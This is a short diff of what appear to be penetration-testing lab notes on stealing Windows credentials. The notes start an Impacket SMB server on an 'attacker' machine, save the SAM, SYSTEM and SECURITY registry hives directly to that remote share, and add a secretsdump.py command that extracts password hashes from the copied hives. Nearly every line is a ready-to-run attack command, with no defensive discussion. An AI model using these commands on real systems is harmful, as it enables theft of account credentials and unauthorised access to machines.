@@ -58,10 +58,13 @@ reg.exe save hklm\sam C:\sam.save
 move sam.save \\<ip>\NameofFileShare
 ---
 attacker: sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
+
 win machine:
 reg save HKLM\SAM \\10.10.15.178\CompData\sam.save
 reg save HKLM\SYSTEM \\10.10.15.178\CompData\system.save
 reg save HKLM\SECURITY \\10.10.15.178\CompData\security.save
+
+attacker: python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
 ---
 
 # Dump password hashes using secretsdump.py
